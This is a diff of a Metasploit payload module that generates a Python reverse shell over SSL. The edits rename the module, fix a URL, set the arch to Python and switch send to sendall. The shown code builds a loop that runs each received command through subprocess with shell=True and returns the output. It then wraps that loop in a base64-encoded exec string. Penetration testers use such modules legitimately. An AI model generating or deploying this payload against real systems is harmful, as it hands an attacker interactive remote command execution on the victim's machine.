@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,19 +8,21 @@ require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = 561
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP SSL (via python)',
+      'Name'          => 'Command Shell, Reverse TCP SSL (via python)',
       'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
       'Author'        => 'RageLtMan',
       'License'       => BSD_LICENSE,
       'Platform'      => 'python',
-      'Arch'          => ARCH_CMD,
+      'Arch'          => ARCH_PYTHON,
       'Handler'       => Msf::Handler::ReverseTcpSsl,
       'Session'       => Msf::Sessions::CommandShell,
       'PayloadType'   => 'python',
@@ -36,8 +38,7 @@ module Metasploit3
   # Constructs the payload
   #
   def generate
-    vprint_good(command_string)
-    return super + command_string
+    super + command_string
   end
 
   #
@@ -58,13 +59,12 @@ module Metasploit3
     cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
     cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
-    cmd += "\ts.send(stdout_value)\n"
+    cmd += "\ts.sendall(stdout_value)\n"
 
-    # The *nix shell wrapper to keep things clean
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
     cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-    return cmd
 
+    cmd
   end
-
 end
+
